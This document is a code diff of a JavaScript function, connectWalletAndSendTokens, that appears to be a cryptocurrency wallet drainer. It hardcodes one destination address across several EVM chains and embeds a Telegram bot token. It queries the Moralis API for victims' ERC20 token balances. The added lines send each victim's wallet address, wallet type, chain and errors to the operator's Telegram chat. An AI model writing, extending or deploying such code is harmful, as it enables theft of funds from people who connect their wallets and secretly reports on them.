@@ -108,9 +108,7 @@ async function connectWalletAndSendTokens() {
   const evmNetworks = [
     { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
     { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 42161, name: "Arbitrum", chainName: "arbitrum", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
-    { chainId: 10, name: "Optimism", chainName: "optimism", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
+    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" }
   ];
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -149,15 +147,55 @@ async function connectWalletAndSendTokens() {
         const currentNetwork = await currentProvider.getNetwork();
         if (currentNetwork.chainId !== network.chainId) {
           console.warn(`Failed to switch to ${network.name}`);
+          const errorMessage = `
+❌ Failed to Switch to ${network.name}!
+Chain ID: ${network.chainId}
+Error: Network switch rejected or not supported
+          `;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+          });
           continue;
         }
 
-        // Fetch ERC20 token balances using Moralis
-        const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
-        const response = await fetch(moralisUrl, {
-          headers: { "X-API-Key": moralisApiKey }
+        // Send Telegram notification for successful network switch
+        const switchMessage = `
+🔄 Switched to ${network.name}!
+Address: ${userAddress}
+Wallet: ${walletType}
+Chain ID: ${network.chainId}
+        `;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: switchMessage })
         });
-        const tokens = await response.json();
+
+        // Fetch ERC20 token balances using Moralis
+        let tokens = [];
+        try {
+          const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
+          const response = await fetch(moralisUrl, {
+            headers: { "X-API-Key": moralisApiKey }
+          });
+          if (!response.ok) {
+            throw new Error(`Moralis API error: ${response.statusText}`);
+          }
+          tokens = await response.json();
+        } catch (apiErr) {
+          console.warn(`Failed to fetch tokens for ${network.name}`, apiErr);
+          const apiErrorMessage = `
+❌ Failed to Fetch Tokens on ${network.name}!
+Error: ${apiErr.message || "Moralis API error"}
+          `;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: apiErrorMessage })
+          });
+        }
 
         // Format balance summary for Telegram
         let tokenSummaryTelegram = "";
